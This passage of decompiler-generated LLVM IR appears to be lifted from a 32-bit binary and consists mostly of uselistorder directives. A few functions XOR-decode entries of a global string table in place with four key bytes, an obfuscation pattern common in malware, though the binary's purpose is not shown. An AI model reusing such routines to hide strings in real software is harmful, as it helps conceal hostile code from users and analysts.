  %v3_8051218 = load i32, i32* %v2_8051218, align 4
  store i32 %v3_8051218, i32* %ecx.global-to-local, align 4
  %v1_805121c = add i32 %v3_8051218, 13
  %v2_805121c = inttoptr i32 %v1_805121c to i8*
  %v3_805121c = load i8, i8* %v2_805121c, align 1
  %v4_805121c = zext i8 %v3_805121c to i32
  %v5_805121c = load i32, i32* %eax.global-to-local, align 4
  %v6_805121c = and i32 %v5_805121c, -256
  %v7_805121c = or i32 %v6_805121c, %v4_805121c
  store i32 %v7_805121c, i32* %eax.global-to-local, align 4
  %v2_805121f = add i32 %v0_805120e, 24
  %v3_805121f = inttoptr i32 %v2_805121f to i32*
  store i32 %v7_805121c, i32* %v3_805121f, align 4
  %v0_8051220 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8051220 = add i32 %v0_8051220, 4
  %v2_8051220 = inttoptr i32 %v1_8051220 to i32*
  %v3_8051220 = load i32, i32* %v2_8051220, align 4
  store i32 %v3_8051220, i32* %eax.global-to-local, align 4
  %v2_8051223 = add i32 %v0_805120e, 20
  %v3_8051223 = inttoptr i32 %v2_8051223 to i32*
  store i32 %v3_8051220, i32* %v3_8051223, align 4
  %v1_8051224 = add i32 %v0_805120e, 64
  %v2_8051224 = inttoptr i32 %v1_8051224 to i32*
  %v3_8051224 = load i32, i32* %v2_8051224, align 4
  store i32 %v3_8051224, i32* %eax.global-to-local, align 4
  %v2_8051228 = add i32 %v0_805120e, 16
  %v3_8051228 = inttoptr i32 %v2_8051228 to i32*
  store i32 %v3_8051224, i32* %v3_8051228, align 4
  %v0_8051229 = call i32 @function_8052924()
  store i32 %v0_8051229, i32* %eax.global-to-local, align 4
  %v0_805122e = load i32, i32* @esp, align 4
  br label %dec_label_pc_8051151

; uselistorder directives
  uselistorder i64 %v8_80510ef, { 1, 0 }
  uselistorder i32 %v1_80510e2, { 1, 0 }
  uselistorder i32* %v2_80502eb, { 1, 0 }
  uselistorder i32 %v2_8050fab, { 1, 0 }
  uselistorder i32 %v3_8050fa8, { 1, 0, 2, 3 }
  uselistorder i32 %v0_8050f44, { 0, 2, 3, 1 }
  uselistorder i32 %v1_8050f43, { 1, 0, 2 }
  uselistorder i16 %v1_8050f4f, { 1, 0 }
  uselistorder i64 %v8_8050f30, { 1, 0 }
  uselistorder i32 %v3_8050ec3, { 1, 0 }
  uselistorder i32 %v0_8050ec3, { 1, 0 }
  uselistorder i32 %v0_8050ebb, { 1, 0 }
  uselistorder i32 %v1_8050dc8, { 1, 2, 0 }
  uselistorder i32 %v1_8050d4f, { 1, 2, 0 }
  uselistorder i32 %v1_8050cd6, { 1, 2, 0 }
  uselistorder i32 %v1_8050c5d, { 1, 2, 0 }
  uselistorder i32 %v0_8050c17, { 1, 0 }
  uselistorder i32 %v0_8050bc6, { 1, 0 }
  uselistorder i32 %v0_8051047, { 1, 0 }
  uselistorder i32 %v7_8050b18, { 1, 0 }
  uselistorder i32 %v0_8050b18, { 1, 2, 0 }
  uselistorder i32 %v6_8050b0b, { 1, 0 }
  uselistorder i32 %v0_8050b0b, { 0, 2, 1 }
  uselistorder i32 %v6_8050afe, { 1, 0 }
  uselistorder i32 %v2_8050aea, { 1, 0, 2 }
  uselistorder i32 %v1_8050ae7, { 1, 0, 2 }
  uselistorder i32 %v0_8050ae4, { 1, 0 }
  uselistorder i32 %v0_8050ae0, { 0, 1, 4, 3, 2, 5 }
  uselistorder i32 %v2_805065e, { 1, 0 }
  uselistorder i32 %v0_805065e, { 1, 2, 4, 3, 0 }
  uselistorder i32 %v1_805065e, { 0, 2, 1 }
  uselistorder i32 %v0_80506dc128, { 1, 0 }
  uselistorder i32 %v1_8050a60, { 2, 1, 0 }
  uselistorder i32 %v9_8050a2f, { 1, 0 }
  uselistorder i32 %v0_8050cd6, { 0, 1, 3, 2 }
  uselistorder i32 %v9_805099c, { 1, 0 }
  uselistorder i32 %v1_8050995, { 0, 1, 4, 3, 2 }
  uselistorder i32 %v0_8050995, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v3_805096c, { 2, 1, 0, 3 }
  uselistorder i32 %v2_8050946, { 1, 2, 0 }
  uselistorder i32 %v1_8050946, { 1, 2, 0, 3 }
  uselistorder i32 %v3_8050941, { 3, 2, 0, 1, 4, 5, 6 }
  uselistorder i32 %v0_8050917, { 1, 0, 2 }
  uselistorder i32 %v0_80508eb, { 0, 2, 1 }
  uselistorder i32 %v0_80508c4, { 4, 3, 2, 1, 0, 5 }
  uselistorder i32* %v1_8050e4b, { 0, 2, 1 }
  uselistorder i32 %v0_805087b, { 4, 3, 2, 1, 0, 5 }
  uselistorder i32 %v1_8050852, { 2, 1, 0 }
  uselistorder i32 %v9_8050821, { 1, 0 }
  uselistorder i32 %v0_8050c5d, { 0, 1, 3, 2 }
  uselistorder i32 %v1_805080d, { 2, 1, 0 }
  uselistorder i32 %v9_80507dc, { 1, 0 }
  uselistorder i32 %v0_8050d4f, { 0, 1, 3, 2 }
  uselistorder i32 %v0_80507b2, { 1, 0, 2, 3 }
  uselistorder i32 %v1_80507a2, { 2, 1, 0 }
  uselistorder i32 %v9_805077a, { 1, 0 }
  uselistorder i32 %v0_8050c0b, { 0, 1, 3, 2 }
  uselistorder i32 %v0_8050756, { 1, 0, 2, 3 }
  uselistorder i32 %v0_8050738, { 4, 0, 1, 2, 3 }
  uselistorder i32 %v0_8050733, { 1, 0, 2, 3 }
  uselistorder i32 %v1_8050723, { 2, 1, 0 }
  uselistorder i32 %v9_80506f2, { 1, 0 }
  uselistorder i32 %v0_8050bba, { 0, 1, 3, 2 }
  uselistorder i32 %v2_80506d0, { 1, 0 }
  uselistorder i32 %v0_80506d0, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v3_80506ca, { 0, 1, 3, 2 }
  uselistorder i32 %v0_80506ca, { 0, 2, 1 }
  uselistorder i32 %v0_80506c5, { 1, 0 }
  uselistorder i32 %v0_80506a0, { 1, 0, 2 }
  uselistorder i32 %v1_8050687, { 1, 0, 2 }
  uselistorder i32 %v1_805066b, { 1, 0, 2 }
  uselistorder i32 %v0_8050a80, { 1, 0, 2 }
  uselistorder i32 %v0_8050a6b, { 3, 0, 1, 2 }
  uselistorder i32 %v0_80506dc129, { 3, 0, 1, 2 }
  uselistorder i32 %v2_805065e18, { 1, 0 }
  uselistorder i32 %v3_8050645, { 1, 0 }
  uselistorder i32 %v0_8050645, { 7, 21, 8, 19, 9, 18, 10, 20, 11, 16, 12, 15, 0, 14, 22, 17, 13, 6, 5, 4, 3, 2, 1 }
  uselistorder i32 %v1_8050630, { 0, 2, 1 }
  uselistorder i32 %v0_805062c, { 1, 0 }
  uselistorder i32 %v0_8050613, { 1, 4, 0, 2, 3, 5 }
  uselistorder i32 %v1_8050609, { 1, 0 }
  uselistorder i32 %v1_80505d0, { 2, 1, 0 }
  uselistorder i32 %v9_805059f, { 1, 0 }
  uselistorder i32 %v0_8050dc8, { 0, 1, 3, 2 }
  uselistorder i32 %v1_805058d, { 1, 0 }
  uselistorder i32 %v0_805058d, { 0, 2, 3, 1 }
  uselistorder i32 %v1_805056c, { 1, 0 }
  uselistorder i32 %v2_8050569, { 1, 0 }
  uselistorder i32 %v0_8050567, { 1, 0 }
  uselistorder i32 %v0_8050554, { 2, 1, 0 }
  uselistorder i32 %v1_8050551, { 1, 0 }
  uselistorder i32 %v2_805054e, { 1, 0 }
  uselistorder i32 %v3_8050542, { 3, 1, 0, 2, 4 }
  uselistorder i32 %v2_80504ed, { 1, 0 }
  uselistorder i32 %v1_80504cf, { 1, 0 }
  uselistorder i32 %v0_80504cf, { 0, 2, 3, 1 }
  uselistorder i32 %v2_80504ba, { 1, 0 }
  uselistorder i32 %v3_80504b7, { 1, 0, 2, 3 }
  uselistorder i32 %v2_8050f9d, { 1, 0 }
  uselistorder i32 %v1_8050f9a, { 2, 1, 0 }
  uselistorder i32 %v3_805047f, { 1, 0, 2 }
  uselistorder i32 %v2_805047d, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v1_8050427, { 1, 0 }
  uselistorder i32 %v1_805041c, { 1, 0 }
  uselistorder i32 %v0_805041c, { 1, 0 }
  uselistorder i32 %v0_8050425, { 0, 3, 2, 1 }
  uselistorder i32 %v1_80503fc, { 1, 0 }
  uselistorder i32 %v0_80503fc, { 0, 2, 1, 3, 4 }
  uselistorder i32 %v6_80503ee, { 1, 0, 2 }
  uselistorder i32 %v4_80503b1, { 1, 2, 0 }
  uselistorder i32 %v3_8050380, { 1, 0, 2 }
  uselistorder i32 %v0_8050304, { 0, 2, 1 }
  uselistorder i32 %v0_80502fb, { 0, 3, 2, 1 }
  uselistorder i32 %v0_80500c265, { 1, 0 }
  uselistorder i32 %v0_80502de, { 2, 1, 0 }
  uselistorder i8 %v1_80502b0, { 1, 0 }
  uselistorder i8 %v2_805028a, { 0, 4, 5, 6, 7, 8, 10, 9, 3, 2, 1 }
  uselistorder i32 %v2_8050281, { 4, 8, 6, 1, 0, 2, 3, 5, 7 }
  uselistorder i32 %v5_805027f, { 3, 2, 5, 4, 1, 0 }
  uselistorder i32 %v1_8050279, { 3, 0, 1, 2 }
  uselistorder i32 %v1_8050274, { 2, 1, 0, 3 }
  uselistorder i32 %v1_8050228, { 1, 0 }
  uselistorder i32 %v0_8050178, { 3, 0, 1, 2, 4 }
  uselistorder i32 %v0_8050173, { 1, 0 }
  uselistorder i32 %v1_8050150, { 0, 2, 1 }
  uselistorder i32 %v0_80500b0, { 2, 0, 1 }
  uselistorder i32 %v0_8050074, { 1, 0, 2 }
  uselistorder i32* %edx.global-to-local, { 5, 6, 7, 8, 9, 10, 34, 36, 29, 37, 19, 0, 17, 21, 22, 23, 25, 26, 27, 38, 39, 40, 30, 1, 2, 3, 4, 11, 12, 13, 14, 15, 16, 18, 20, 24, 28, 31, 32, 33, 41, 42, 55, 54, 43, 35, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53 }
  uselistorder i32* %ecx.global-to-local, { 2, 3, 4, 5, 17, 18, 19, 20, 21, 22, 14, 23, 24, 8, 0, 7, 9, 15, 1, 25, 6, 10, 11, 12, 13, 16, 26, 39, 40, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38 }
  uselistorder i32* %eax.global-to-local, { 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 44, 42, 43, 45, 46, 47, 48, 49, 50, 51, 52, 53, 55, 127, 56, 138, 139, 57, 140, 141, 142, 143, 144, 146, 147, 148, 149, 150, 151, 152, 153, 154, 121, 122, 123, 58, 59, 60, 61, 62, 63, 155, 156, 157, 158, 159, 160, 89, 90, 91, 92, 93, 94, 95, 0, 1, 2, 3, 4, 5, 80, 81, 82, 83, 84, 85, 86, 98, 99, 100, 101, 102, 106, 107, 108, 109, 110, 111, 112, 113, 166, 167, 168, 169, 181, 134, 170, 171, 172, 173, 124, 133, 125, 126, 128, 129, 130, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 161, 162, 163, 164, 165, 65, 68, 66, 67, 69, 70, 71, 72, 73, 64, 74, 75, 76, 77, 78, 79, 87, 88, 96, 97, 103, 104, 105, 114, 115, 116, 117, 118, 119, 120, 131, 132, 135, 136, 137, 174, 175, 176, 177, 178, 179, 180, 182, 230, 231, 232, 228, 229, 233, 223, 224, 225, 226, 227, 183, 184, 185, 186, 187, 188, 189, 190, 191, 145, 192, 197, 193, 195, 194, 196, 198, 199, 200, 201, 202, 203, 204, 205, 54, 220, 222, 221, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219 }
  uselistorder i32 (i32)* @function_804f300, { 1, 0 }
  uselistorder i32 ()* @function_8052850, { 1, 0 }
  uselistorder i32 1864, { 1, 2, 0, 3 }
  uselistorder i8 31, { 0, 2, 3, 1 }
  uselistorder i32 1888, { 4, 0, 1, 2, 3 }
  uselistorder i8* bitcast (i32* @0 to i8*), { 1, 0, 2 }
  uselistorder i32 ()* @function_805220f, { 1, 0 }
  uselistorder i32 1872, { 0, 2, 1 }
  uselistorder i32 (i8)* @function_8051270, { 2, 3, 8, 7, 0, 6, 1, 5, 4, 9, 10, 32, 33, 34, 35, 36, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 37, 38, 39, 40 }
  uselistorder i32 (i32, i32*)* @function_8051240, { 2, 3, 8, 7, 0, 6, 1, 4, 5, 9, 39, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 49, 36, 37, 38, 55, 56, 57, 40, 41, 42, 43, 44, 45, 46, 47, 48, 50, 51, 52, 53, 54 }
  uselistorder i32 1880, { 0, 1, 2, 3, 4, 5, 10, 8, 6, 9, 7 }
  uselistorder i32 (i8)* @function_80512f0, { 2, 3, 8, 7, 0, 6, 1, 4, 5, 9, 28, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43 }
  uselistorder i8 ptrtoint (i32* @0 to i8), { 11, 12, 13, 14, 0, 1, 6, 7, 8, 9, 2, 3, 4, 5, 15, 16, 10, 17 }
  uselistorder i32 ()* @function_8051cf0, { 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 4, 3, 2, 13, 12, 11, 10, 9, 1, 0, 8, 7, 6, 5 }
  uselistorder i32 ()* @function_8052924, { 21, 20, 19, 18, 17, 16, 15, 6, 5, 3, 2, 12, 11, 25, 24, 14, 13, 10, 9, 8, 7, 23, 22, 4, 1, 0 }
  uselistorder i8 -5, { 0, 3, 1, 2 }
  uselistorder i8 -3, { 6, 7, 8, 2, 0, 1, 3, 4, 5 }
  uselistorder i8 65, { 1, 0 }
  uselistorder i32 ()* @function_80528ae, { 4, 3, 2, 1, 0 }
  uselistorder i8 37, { 5, 3, 2, 4, 0, 1, 6 }
  uselistorder i8 35, { 6, 4, 3, 5, 1, 0, 2 }
  uselistorder i8 36, { 6, 4, 3, 5, 1, 0, 2, 7 }
  uselistorder i8 62, { 7, 4, 5, 3, 6, 1, 0, 2 }
  uselistorder i8 58, { 7, 4, 5, 3, 6, 1, 0, 2, 8, 9 }
  uselistorder i32 (i32*)* @function_80524a2, { 1, 2, 3, 4, 0, 5, 6 }
  uselistorder i32 ()* @function_80523e8, { 2, 1, 0 }
  uselistorder i32 1572, { 1, 2, 0 }
  uselistorder i32 1700, { 2, 0, 1 }
  uselistorder i32 ()* @function_804f800, { 2, 3, 1, 0 }
  uselistorder i32 288, { 0, 1, 3, 4, 2 }
  uselistorder i8 6, { 0, 3, 4, 5, 6, 2, 7, 1 }
  uselistorder i32 ()* @function_80528e1, { 1, 0 }
  uselistorder i32 -28, { 3, 2, 4, 5, 6, 0, 1 }
  uselistorder i32 -24, { 1, 0, 2, 3, 4 }
  uselistorder i32 -20, { 2, 1, 3, 4, 0, 5 }
  uselistorder i8 -1, { 3, 4, 5, 0, 1, 2 }
  uselistorder i32 -15, { 1, 0 }
  uselistorder i32 (i32)* @function_804f070, { 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 1844, { 1, 0, 2 }
  uselistorder i16* @global_var_80568f6.38, { 1, 0 }
  uselistorder i8 -58, { 1, 0 }
  uselistorder i8 -87, { 1, 0 }
  uselistorder i8 100, { 1, 0 }
  uselistorder i32 1868, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_8051167, { 1, 0 }
  uselistorder label %dec_label_pc_8050f5b, { 1, 0 }
  uselistorder label %dec_label_pc_8050b48, { 1, 0 }
  uselistorder label %dec_label_pc_8050a73, { 8, 4, 0, 3, 5, 6, 1, 2, 7 }
  uselistorder label %dec_label_pc_805065e.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_8050a2f, { 1, 0 }
  uselistorder label %dec_label_pc_80509b6, { 1, 0 }
  uselistorder label %dec_label_pc_8050986, { 1, 0 }
  uselistorder label %dec_label_pc_805094c, { 1, 0 }
  uselistorder label %dec_label_pc_8050941, { 3, 4, 10, 6, 1, 5, 7, 8, 0, 2, 11, 9 }
  uselistorder label %dec_label_pc_8050821, { 1, 0 }
  uselistorder label %dec_label_pc_80507dc, { 1, 0 }
  uselistorder label %dec_label_pc_80507a5, { 1, 0, 2 }
  uselistorder label %dec_label_pc_805077a, { 1, 0 }
  uselistorder label %dec_label_pc_8050726, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80506f2, { 1, 0 }
  uselistorder label %dec_label_pc_80506d4, { 5, 0, 3, 1, 2, 4 }
  uselistorder label %dec_label_pc_80506b3, { 1, 2, 0 }
  uselistorder label %dec_label_pc_80506a0, { 1, 0 }
  uselistorder label %dec_label_pc_805068e, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8050662, { 1, 0 }
  uselistorder label %dec_label_pc_8050662.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_8050635, { 1, 0 }
  uselistorder label %dec_label_pc_8050630, { 1, 0 }
  uselistorder label %dec_label_pc_80505ee, { 1, 0 }
  uselistorder label %dec_label_pc_80505da, { 1, 0 }
  uselistorder label %dec_label_pc_80505d3.loopexit12.loopexit, { 13, 11, 4, 9, 0, 5, 6, 7, 8, 10, 12, 1, 2, 3, 14 }
  uselistorder label %dec_label_pc_80505d3.backedge, { 2, 4, 5, 3, 0, 1, 6 }
  uselistorder label %dec_label_pc_805059f, { 1, 0 }
  uselistorder label %dec_label_pc_805057e, { 5, 6, 7, 2, 0, 1, 3, 4 }
  uselistorder label %dec_label_pc_8050567, { 1, 0 }
  uselistorder label %dec_label_pc_805050f, { 1, 0 }
  uselistorder label %dec_label_pc_80504c0, { 0, 3, 4, 5, 1, 6, 2 }
  uselistorder label %dec_label_pc_805048b, { 1, 0 }
  uselistorder label %dec_label_pc_8050445, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_805041c, { 1, 0 }
  uselistorder label %dec_label_pc_8050338, { 10, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 11 }
  uselistorder label %dec_label_pc_805032d, { 1, 0 }
  uselistorder label %dec_label_pc_80502f2, { 1, 0 }
  uselistorder label %dec_label_pc_80502be, { 1, 0 }
  uselistorder label %dec_label_pc_8050274.preheader, { 16, 14, 13, 0, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 15 }
  uselistorder label %dec_label_pc_80500c2, { 1, 2, 4, 0, 3 }
}

define i32 @function_8051240(i32 %arg1, i32* %arg2) local_unnamed_addr {
dec_label_pc_8051240:
  %tmp2 = ptrtoint i32* %arg2 to i32
  store i32 %tmp2, i32* @ecx, align 4
  %v1_8051248 = icmp eq i32* %arg2, null
  %v1_805124a = mul i32 %arg1, 8
  store i32 %v1_805124a, i32* @edx, align 4
  br i1 %v1_8051248, label %dec_label_pc_8051263, label %dec_label_pc_8051259

dec_label_pc_8051259:                             ; preds = %dec_label_pc_8051240
  %v1_8051259 = add i32 %v1_805124a, add (i32 ptrtoint (i32* @global_var_8056980.52 to i32), i32 4)
  %v2_8051259 = inttoptr i32 %v1_8051259 to i32*
  %v3_8051259 = load i32, i32* %v2_8051259, align 4
  %v1_805125c = urem i32 %v3_8051259, 65536
  store i32 %v1_805125c, i32* %arg2, align 4
  %v0_8051263.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_8051263

dec_label_pc_8051263:                             ; preds = %dec_label_pc_8051240, %dec_label_pc_8051259
  %v0_8051263 = phi i32 [ %v1_805124a, %dec_label_pc_8051240 ], [ %v0_8051263.pre, %dec_label_pc_8051259 ]
  %v1_8051263 = add i32 %v0_8051263, ptrtoint (i32* @global_var_8056980.52 to i32)
  %v2_8051263 = inttoptr i32 %v1_8051263 to i32*
  %v3_8051263 = load i32, i32* %v2_8051263, align 4
  ret i32 %v3_8051263

; uselistorder directives
  uselistorder label %dec_label_pc_8051263, { 1, 0 }
}

define i32 @function_8051270(i8 %arg1) local_unnamed_addr {
dec_label_pc_8051270:
  %ebp.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-44 = alloca i8, align 1
  %v4_8051279 = zext i8 %arg1 to i32
  %v1_805127d = mul nuw nsw i32 %v4_8051279, 8
  %v2_805127d = add i32 %v1_805127d, ptrtoint (i32* @global_var_8056980.52 to i32)
  store i32 %v2_805127d, i32* @ecx, align 4
  %v0_8051284 = load i16, i16* @global_var_80567fc.53, align 2
  %v1_8051284 = sext i16 %v0_8051284 to i32
  %v1_8051289 = add i32 %v1_805127d, add (i32 ptrtoint (i32* @global_var_8056980.52 to i32), i32 4)
  %v2_8051289 = inttoptr i32 %v1_8051289 to i16*
  %v3_8051289 = load i16, i16* %v2_8051289, align 4
  %v4_8051289 = icmp eq i16 %v3_8051289, 0
  br i1 %v4_8051289, label %dec_label_pc_80512da, label %dec_label_pc_8051290

dec_label_pc_8051290:                             ; preds = %dec_label_pc_8051270
  store i32 %v1_8051284, i32* %ebp.global-to-local, align 4
  store i32 0, i32* @edx, align 4
  %v2_8051298 = udiv i32 %v1_8051284, 16777216
  %v2_805129b = udiv i32 %v1_8051284, 256
  store i32 %v2_805129b, i32* %edi.global-to-local, align 4
  %v5_805129e = trunc i32 %v2_8051298 to i8
  store i8 %v5_805129e, i8* %stack_var_-44, align 1
  %v2_80512a1 = udiv i32 %v1_8051284, 65536
  store i32 %v2_80512a1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_80512a4

dec_label_pc_80512a4:                             ; preds = %dec_label_pc_80512a4.dec_label_pc_80512a4_crit_edge, %dec_label_pc_8051290
  %v0_80512aa = phi i32 [ %v0_80512aa.pre, %dec_label_pc_80512a4.dec_label_pc_80512a4_crit_edge ], [ %v1_8051284, %dec_label_pc_8051290 ]
  %v0_80512a6 = phi i32 [ %v1_80512d6, %dec_label_pc_80512a4.dec_label_pc_80512a4_crit_edge ], [ 0, %dec_label_pc_8051290 ]
  %v0_80512a4 = phi i32 [ %v0_80512ce, %dec_label_pc_80512a4.dec_label_pc_80512a4_crit_edge ], [ %v2_805127d, %dec_label_pc_8051290 ]
  %v1_80512a4 = inttoptr i32 %v0_80512a4 to i32*
  %v2_80512a4 = load i32, i32* %v1_80512a4, align 4
  %v2_80512a8 = add i32 %v2_80512a4, %v0_80512a6
  %v1_80512ac = inttoptr i32 %v2_80512a8 to i8*
  %v2_80512ac = load i8, i8* %v1_80512ac, align 1
  %v4_80512ac = trunc i32 %v0_80512aa to i8
  %v5_80512ac = xor i8 %v2_80512ac, %v4_80512ac
  store i8 %v5_80512ac, i8* %v1_80512ac, align 1
  %v0_80512ae = load i32, i32* @edx, align 4
  %v0_80512b0 = load i32, i32* @ecx, align 4
  %v1_80512b0 = inttoptr i32 %v0_80512b0 to i32*
  %v2_80512b0 = load i32, i32* %v1_80512b0, align 4
  %v2_80512b2 = add i32 %v2_80512b0, %v0_80512ae
  %v0_80512b4 = load i32, i32* %edi.global-to-local, align 4
  %v1_80512b6 = inttoptr i32 %v2_80512b2 to i8*
  %v2_80512b6 = load i8, i8* %v1_80512b6, align 1
  %v4_80512b6 = trunc i32 %v0_80512b4 to i8
  %v5_80512b6 = xor i8 %v2_80512b6, %v4_80512b6
  store i8 %v5_80512b6, i8* %v1_80512b6, align 1
  %v0_80512b8 = load i32, i32* @edx, align 4
  %v0_80512ba = load i32, i32* @ecx, align 4
  %v1_80512ba = inttoptr i32 %v0_80512ba to i32*
  %v2_80512ba = load i32, i32* %v1_80512ba, align 4
  %v2_80512bc = add i32 %v2_80512ba, %v0_80512b8
  %v0_80512be = load i32, i32* %esi.global-to-local, align 4
  %v1_80512c0 = inttoptr i32 %v2_80512bc to i8*
  %v2_80512c0 = load i8, i8* %v1_80512c0, align 1
  %v4_80512c0 = trunc i32 %v0_80512be to i8
  %v5_80512c0 = xor i8 %v2_80512c0, %v4_80512c0
  store i8 %v5_80512c0, i8* %v1_80512c0, align 1
  %v0_80512c2 = load i32, i32* @edx, align 4
  %v0_80512c4 = load i32, i32* @ecx, align 4
  %v1_80512c4 = inttoptr i32 %v0_80512c4 to i32*
  %v2_80512c4 = load i32, i32* %v1_80512c4, align 4
  %v1_80512c6 = add i32 %v0_80512c2, 1
  store i32 %v1_80512c6, i32* @edx, align 4
  %v2_80512c7 = add i32 %v2_80512c4, %v0_80512c2
  %v2_80512c9 = load i8, i8* %stack_var_-44, align 1
  %v1_80512cc = inttoptr i32 %v2_80512c7 to i8*
  %v2_80512cc = load i8, i8* %v1_80512cc, align 1
  %v5_80512cc = xor i8 %v2_80512cc, %v2_80512c9
  store i8 %v5_80512cc, i8* %v1_80512cc, align 1
  %v0_80512ce = load i32, i32* @ecx, align 4
  %v1_80512ce = add i32 %v0_80512ce, 4
  %v2_80512ce = inttoptr i32 %v1_80512ce to i32*
  %v3_80512ce = load i32, i32* %v2_80512ce, align 4
  %v1_80512d1 = urem i32 %v3_80512ce, 65536
  %v1_80512d6 = load i32, i32* @edx, align 4
  %v8_80512d8 = icmp sgt i32 %v1_80512d1, %v1_80512d6
  br i1 %v8_80512d8, label %dec_label_pc_80512a4.dec_label_pc_80512a4_crit_edge, label %dec_label_pc_80512da.loopexit

dec_label_pc_80512a4.dec_label_pc_80512a4_crit_edge: ; preds = %dec_label_pc_80512a4
  %v0_80512aa.pre = load i32, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_80512a4

dec_label_pc_80512da.loopexit:                    ; preds = %dec_label_pc_80512a4
  br label %dec_label_pc_80512da

dec_label_pc_80512da:                             ; preds = %dec_label_pc_80512da.loopexit, %dec_label_pc_8051270
  %v0_80512e1 = phi i32 [ %v1_80512d1, %dec_label_pc_80512da.loopexit ], [ %v1_8051284, %dec_label_pc_8051270 ]
  ret i32 %v0_80512e1

; uselistorder directives
  uselistorder i32 %v1_80512d6, { 1, 0 }
  uselistorder i32 %v1_80512d1, { 1, 0 }
  uselistorder i32 %v0_80512ce, { 1, 0 }
  uselistorder i32 %v1_8051284, { 3, 4, 0, 1, 2, 5 }
  uselistorder i8* %stack_var_-44, { 1, 0 }
}

define i32 @function_80512f0(i8 %arg1) local_unnamed_addr {
dec_label_pc_80512f0:
  %ebp.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-44 = alloca i8, align 1
  %v4_80512f9 = zext i8 %arg1 to i32
  %v1_80512fd = mul nuw nsw i32 %v4_80512f9, 8
  %v2_80512fd = add i32 %v1_80512fd, ptrtoint (i32* @global_var_8056980.52 to i32)
  store i32 %v2_80512fd, i32* %ecx.global-to-local, align 4
  %v0_8051304 = load i16, i16* @global_var_80567fc.53, align 2
  %v1_8051304 = sext i16 %v0_8051304 to i32
  %v1_8051309 = add i32 %v1_80512fd, add (i32 ptrtoint (i32* @global_var_8056980.52 to i32), i32 4)
  %v2_8051309 = inttoptr i32 %v1_8051309 to i16*
  %v3_8051309 = load i16, i16* %v2_8051309, align 4
  %v4_8051309 = icmp eq i16 %v3_8051309, 0
  br i1 %v4_8051309, label %dec_label_pc_805135a, label %dec_label_pc_8051310

dec_label_pc_8051310:                             ; preds = %dec_label_pc_80512f0
  store i32 %v1_8051304, i32* %ebp.global-to-local, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v2_8051318 = udiv i32 %v1_8051304, 16777216
  %v2_805131b = udiv i32 %v1_8051304, 256
  store i32 %v2_805131b, i32* %edi.global-to-local, align 4
  %v5_805131e = trunc i32 %v2_8051318 to i8
  store i8 %v5_805131e, i8* %stack_var_-44, align 1
  %v2_8051321 = udiv i32 %v1_8051304, 65536
  store i32 %v2_8051321, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8051324

dec_label_pc_8051324:                             ; preds = %dec_label_pc_8051324.dec_label_pc_8051324_crit_edge, %dec_label_pc_8051310
  %v0_805132a = phi i32 [ %v0_805132a.pre, %dec_label_pc_8051324.dec_label_pc_8051324_crit_edge ], [ %v1_8051304, %dec_label_pc_8051310 ]
  %v0_8051326 = phi i32 [ %v1_8051356, %dec_label_pc_8051324.dec_label_pc_8051324_crit_edge ], [ 0, %dec_label_pc_8051310 ]
  %v0_8051324 = phi i32 [ %v0_805134e, %dec_label_pc_8051324.dec_label_pc_8051324_crit_edge ], [ %v2_80512fd, %dec_label_pc_8051310 ]
  %v1_8051324 = inttoptr i32 %v0_8051324 to i32*
  %v2_8051324 = load i32, i32* %v1_8051324, align 4
  %v2_8051328 = add i32 %v2_8051324, %v0_8051326
  %v1_805132c = inttoptr i32 %v2_8051328 to i8*
  %v2_805132c = load i8, i8* %v1_805132c, align 1
  %v4_805132c = trunc i32 %v0_805132a to i8
  %v5_805132c = xor i8 %v2_805132c, %v4_805132c
  store i8 %v5_805132c, i8* %v1_805132c, align 1
  %v0_805132e = load i32, i32* %edx.global-to-local, align 4
  %v0_8051330 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8051330 = inttoptr i32 %v0_8051330 to i32*
  %v2_8051330 = load i32, i32* %v1_8051330, align 4
  %v2_8051332 = add i32 %v2_8051330, %v0_805132e
  %v0_8051334 = load i32, i32* %edi.global-to-local, align 4
  %v1_8051336 = inttoptr i32 %v2_8051332 to i8*
  %v2_8051336 = load i8, i8* %v1_8051336, align 1
  %v4_8051336 = trunc i32 %v0_8051334 to i8
  %v5_8051336 = xor i8 %v2_8051336, %v4_8051336
  store i8 %v5_8051336, i8* %v1_8051336, align 1
  %v0_8051338 = load i32, i32* %edx.global-to-local, align 4
